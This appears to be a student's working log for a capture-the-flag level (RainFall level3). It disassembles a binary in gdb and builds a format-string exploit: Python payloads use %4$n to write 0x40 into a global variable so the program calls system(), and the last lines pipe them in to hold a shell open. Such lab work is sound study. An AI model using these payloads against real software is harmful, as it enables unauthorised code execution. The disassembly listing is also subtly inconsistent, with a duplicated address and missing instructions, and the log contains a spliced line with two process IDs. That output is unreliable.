# Research notes

This is the working log, including experiments that did not succeed. The verified VM procedure is in `../walkthrough`. Addresses from local experiments may differ from the ISO VM.

```bash
$ objdump -w ./level3 \
    -j .text \
    -M intel \
    --disassemble=v \
    --no-show-raw-insn \
    --visualize-jumps=extended-color
```

```bash
$ gdb ./level3
(gdb) disas v
Dump of assembler code for function v:
0x080484a4 <+0>:	push   ebp
0x080484a5 <+1>:	mov    ebp,esp
0x080484a7 <+3>:	sub    esp,0x218
0x080484ad <+9>:	mov    eax,ds:0x8049860
0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
0x080484c7 <+46>:	mov    DWORD PTR [esp],eax
0x080484d5 <+49>:	call   0x8048390 <printf@plt>
0x080484da <+54>:	mov    eax,ds:0x804988c
0x080484df <+59>:	cmp    eax,0x40
0x080484e2 <+62>:	jne    0x8048518 <v+116>
0x080484eb <+71>:	mov    eax,0x8048600
0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
0x08048504 <+96>:	mov    DWORD PTR [esp],eax
0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
0x08048513 <+111>:	call   0x80483c0 <system@plt>
0x08048518 <+116>:	leave
0x08048519 <+117>:	ret
End of assembler dump.

(gdb) set args < <(python2.7 -c 'import struct; print struct.pack("<I", 0x8048444) + " BBB 0x%4$x 0x%5$x "')
(gdb) r
D BBB 0x8048444 0x42424220
[Inferior 1 (process 2071) exited normally[Inferior 1 (process 2061) exited normally]
16:15:02 ✔ abelov:(main)~/.../RainFall/level3$ pwndbg ./level3
Reading symbols from ./level3...
(No debugging symbols found in ./level3)
pwndbg: loaded 200 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 12 GDB functions (can be used with print/break). Type help function to see them.
------- tip of the day (disable with set show-tips off) -------
If your program has multiple threads they will be displayed in the context display or using the context threads command

(gdb) br *v +49
Breakpoint 1 at 0x80484d5
(gdb) br *v + 54
Breakpoint 2 at 0x80484da
(gdb) i addr 0x804988c
No symbol "0x804988c" in current context.
(gdb) i sym 0x804988c
m in section .bss
(gdb) x/x 0x804988c
0x804988c <m>:	0x00000000

(gdb) set args < <(python2.7 -c 'import struct; \
  print struct.pack("<I", 0x804988c) + \
  " BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB 0x%4$x 0x%5$x %4$n"')

(gdb) r
Starting program: /home/abelov/git/c/42london/RainFall/level3/level3 < <(python2.7 -c 'import struct; print struct.pack("<I", 0x804988c) + " BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB 0x%4$x 0x%5$x %4$n"')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x080484d5 in v ()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
(gdb) x/x 0x804988c
0x804988c <m>:	0x00000000
(gdb) c
Continuing.
� BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB 0x804988c 0x42424220

Breakpoint 2, 0x080484da in v ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
(gdb) x/x 0x804988c
0x804988c <m>:	0x00000040


```


```bash
set exec-wrapper setarch i386 -R -X

(gdb) !printf '%.0s=' {1..60} ; printf '%20s' | tr ' ' '\n';


# using printf positional arguments
% [argument$] [flags] [width] [.precision] [length] conversion

(python2.7 -c 'import struct; print struct.pack("<I", 0x804988c) + "A" * 60 + "%4$n"'; cat ) | ./level3

(python2.7 -c 'import struct; \
  print struct.pack("<I",0x804988c) + struct.pack("<I", 0xBAADF00D) + \
  " Oh no! You’ve been pwned! =(+_+)= 0x%5$-16X %4$n"'; cat ) | ./level3


```
